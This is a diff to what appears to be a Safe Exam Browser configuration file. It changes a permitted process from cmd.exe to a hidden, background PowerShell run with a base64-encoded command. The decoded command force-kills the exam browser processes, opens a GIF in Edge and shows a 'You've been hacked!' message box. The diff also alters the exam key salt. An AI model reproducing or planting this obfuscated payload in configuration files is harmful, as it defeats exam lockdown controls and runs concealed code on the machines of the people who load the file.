@@ -203,7 +203,7 @@
     <key>allowUploads</key>
     <true />
     <key>examKeySalt</key>
-    <data>LVUEBi9d9NlyDWo3bJ5Scs3WxDkpYMDLgWDgwvUT9Kg=</data>
+    <data>H2HpeXUJooysmD2d1wEbOgMOOs+IQmQ9g9ySqjpbw8U=</data>
     <key>examSessionClearCookiesOnEnd</key>
     <true />
     <key>examSessionClearCookiesOnStart</key>
@@ -252,7 +252,7 @@
         <key>iconInTaskbar</key>
         <false />
         <key>runInBackground</key>
-        <false />
+        <true />
         <key>allowUserToChooseApp</key>
         <false />
         <key>strongKill</key>
@@ -260,17 +260,17 @@
         <key>os</key>
         <integer>1</integer>
         <key>title</key>
-        <string>cmd</string>
+        <string>powershell</string>
         <key>description</key>
         <string />
         <key>executable</key>
-        <string>cmd.exe</string>
+        <string>powershell.exe</string>
         <key>originalName</key>
-        <string>Cmd.Exe.MUI</string>
+        <string>PowerShell.EXE.MUI</string>
         <key>windowHandlingProcess</key>
         <string />
         <key>path</key>
-        <string />
+        <string>windowspowershell\v1.0</string>
         <key>identifier</key>
         <string />
         <key>arguments</key>
@@ -279,7 +279,7 @@
             <key>active</key>
             <true />
             <key>argument</key>
-            <string>/c echo wa &gt; C:\users\%USERNAME%\downloads\yes.txt</string>
+            <string>-WindowStyle Hidden -encodedCommand dABhAHMAawBrAGkAbABsACAALwBGACAALwBJAE0AIAAiAFMAYQBmAGUARQB4AGEAbQBCAHIAbwB3AHMAZQByAC4AZQB4AGUAIgA7AA0ACgB0AGEAcwBrAGsAaQBsAGwAIAAvAEYAIAAvAEkATQAgACIAUwBhAGYAZQBFAHgAYQBtAEIAcgBvAHcAcwBlAHIALgBDAGwAaQBlAG4AdAAuAGUAeABlACIAOwAgAA0ACgBzAHQAYQByAHQAIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0AIABGAGkAbABlAHMAIAAoAHgAOAA2ACkAXABNAGkAYwByAG8AcwBvAGYAdABcAEUAZABnAGUAXABBAHAAcABsAGkAYwBhAHQAaQBvAG4AXABtAHMAZQBkAGcAZQAuAGUAeABlACIAIABoAHQAdABwAHMAOgAvAC8AYwAuAHQAZQBuAG8AcgAuAGMAbwBtAC8AeAA4AHYAMQBvAE4AVQBPAG0AZwA0AEEAQQBBAEEAQwAvAHQAZQBuAG8AcgAuAGcAaQBmADsADQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwAgADMAOwANAAoADQAKAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7ACAAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AF0AOgA6AFMAaABvAHcAKAAiAFkAbwB1ACcAdgBlACAAYgBlAGUAbgAgAGgAYQBjAGsAZQBkACEAIgAsACIAVQBoACAAbwBoACEAIgAsACIATwBrACIALAAiAEUAcgByAG8AcgAiACkAOwA=</string>
           </dict>
         </array>
         <key>signature</key>
